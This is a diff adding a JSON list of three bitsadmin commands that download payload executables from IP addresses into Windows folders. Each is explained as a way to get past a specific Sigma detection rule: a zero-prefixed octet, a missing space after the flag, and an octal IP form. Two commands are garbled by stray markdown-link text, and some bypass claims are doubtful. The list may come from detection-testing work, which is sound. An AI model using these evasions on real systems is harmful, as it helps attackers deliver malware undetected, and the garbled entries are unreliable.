@@ -1,0 +1,14 @@
+[
+  {
+    "output": "bitsadmin /transfer downloadJob http://010.0.0.1/malicious.exe C:\\Windows\\Temp\\malicious.exe",
+    "explanation": "The command uses bitsadmin with the /transfer flag but the URL employs an IP address where the first octet begins with a zero (010), preventing the ://[1-9] pattern that the sigma rule uses to detect IP-based downloads. This bypasses the rule while still achieving a download from an IP address."
+  },
+  {
+    "output": "bitsadmin.exe /transfer/DownloadJob /download /priority normal [http://192.168.1.100/payload.exe](https://www.google.com/search?q=http://192.168.1.100/payload.exe) C:\\Windows\\Tasks\\payload.exe",
+    "explanation": "The rule expects 'all of selection_*' to be true, and 'selection_flags' explicitly requires a leading and trailing space around the tokens (e.g., ' /transfer '). By removing the space between the flag name and its subsequent parameter (e.g., '/transfer/DownloadJob'), bitsadmin still interprets the command correctly at runtime while breaking the exact string pattern matching inside the selection_flags block."
+  },
+  {
+    "output": "bitsadmin.exe /transfer MyJob [http://0300]().0250.0001.0144/payload.exe C:\\Windows\\Tasks\\payload.exe",
+    "explanation": "The 'selection_extension' block uses basic string searching to identify a direct IP structure by looking for combinations like '://1', '://2', etc., right after the protocol string. Converting the target IPv4 address into an alternative format such as an Octal representation (e.g., '0300.0250...' for '192.168.1.100') causes the URL protocol separator sequence to be followed by a '0', bypassing the specific regex or list matching constraints for digits 1-9 while still resolving correctly on Windows networks."
+  }
+]
